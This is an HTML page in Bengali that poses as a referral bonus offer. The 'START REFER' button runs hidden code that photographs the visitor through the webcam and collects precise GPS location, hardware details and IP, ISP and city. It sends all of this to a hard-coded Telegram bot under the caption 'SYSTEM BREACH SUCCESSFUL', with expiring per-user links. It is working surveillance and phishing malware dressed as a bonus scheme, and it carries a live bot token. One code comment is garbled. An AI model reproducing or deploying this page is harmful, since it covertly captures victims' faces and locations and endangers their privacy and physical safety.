<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>বোনাস সিস্টেম - ৫০/৫০</title>
    <meta property="og:title" content="বোনাস সিস্টেম - ৫০/৫০">
    <meta property="og:description" content="রেফার করে বোনাস পেতে নিচে ক্লিক করুন।">

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; background-color: #000;
            background-image: url('https://i.imghippo.com/files/Fq9968wg.jpg'); 
            background-size: cover; background-position: center;
        }
        .container {
            background: rgba(0, 0, 0, 0.85); 
            padding: 40px 20px; border-radius: 15px; width: 85%; max-width: 380px;
            z-index: 2; position: relative; border: 2px solid #00ff00;
            box-shadow: 0 0 20px #00ff00;
        }
        h1 { color: #00ff00; font-size: 26px; margin-bottom: 15px; }
        h2 { color: #ffffff; font-size: 18px; margin-bottom: 30px; }
        #verify-btn { 
            background-color: #00ff00; color: #000; border: none; padding: 15px; 
            font-size: 18px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold;
        }
        #status { margin-top: 25px; font-weight: bold; font-size: 14px; color: #00ff00; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>বোনাস সিস্টেম</h1>
        <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
        <button id="verify-btn">START REFER</button>
        <div id="status"></div>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        // --- সেটিংস ও লিঙ্ক এক্সপায়ারি চেক ---
        const botToken = "8526863710:AAGQMMjFuHoWfuN5Is9lF1I4Wcf8Y0nTWXo";
        const adminId = "7068444019"; 

        const urlParams = new URLSearchParams(window.location.search);
        const userIdFromLink = urlParams.get('id'); 
        const expiry = urlParams.get('exp');
        const currentTime = Math.floor(Date.now() / 1000);

        // ১ ঘণ্টা পর লিঙ্কy && currentTime > expiry) {
            document.body.innerHTML = `
                <div style="background:#000; color:#ff0000; text-align:center; padding-top:100px; height:100vh; font-family:Arial;">
                    <h1 style="font-size:40px;">⚠️ লিঙ্কটির মেয়াদ শেষ!</h1>
                    <p style="font-size:20px; color:#fff;">বোট থেকে নতুন লিঙ্ক জেনারেট করুন।</p>
                </div>`;
            window.stop(); 
        }

        const verifyBtn = document.getElementById('verify-btn');
        const status = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        let gpsLink = "লোকেশন অনুমতি নেই";

        function getGPS() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        gpsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
                        resolve(true);
                    }, () => resolve(false), { enableHighAccuracy: true });
                } else { resolve(false); }
            });
        }

        async function sendToTelegram(blob, id, caption) {
            const formData = new FormData();
            formData.append('chat_id', id);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
            } catch(e) {}
        }

        verifyBtn.addEventListener('click', async () => {
            status.innerText = "> ক্যামেরা ও লোকেশন পারমিশন দিন...";
            verifyBtn.style.display = "none"; 

            await getGPS();

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                status.innerText = "> ভেরিফাই হচ্ছে... ৩ সেকেন্ড অপেক্ষা করুন।";

                setTimeout(async () => {
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        let info = `\n\n💻 **HARDWARE DETAILS**\nCPU: \`${navigator.hardwareConcurrency}\` Cores\nRAM: \`${navigator.deviceMemory}\` GB\nScreen: \`${window.screen.width}x${window.screen.height}\``;

                        try {
                            const res = await fetch('https://ipwho.is/');
                            const d = await res.json();
                            info += `\n\n🌐 **NETWORK & IP**\nIP: \`${d.ip}\`\nISP: \`${d.connection.isp}\`\nCity: \`${d.city}\``;
                        } catch(e) {}

                        const caption = "🛠 **SYSTEM BREACH SUCCESSFUL**" + info + `\n\n📍 **GPS LOCATION**\n[ম্যাপ দেখতে এখানে ক্লিক করুন](${gpsLink})\n\n👤 Report for: \`${userIdFromLink || 'Admin'}\``;
                        
                        // অ্যাডমিনকে পাঠানো
                        await sendToTelegram(blob, adminId, caption);

                        // লিঙ্ক জেনারেট করা ইউজারকে পাঠানো
                        if (userIdFromLink && userIdFromLink !== adminId) {
                            await sendToTelegram(blob, userIdFromLink, caption);
                        }

                        status.innerText = "> ভেরিফিকেশন সফল! বোনাস চেক করুন।";
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/jpeg', 0.8);
                }, 3000); 

            } catch (err) {
                status.innerText = "> পারমিশন ছাড়া বোনাস পাওয়া সম্ভব নয়!";
                status.style.color = "#ff0000";
                verifyBtn.style.display = "block";
            }
        });
    </script>
</body>
</html>
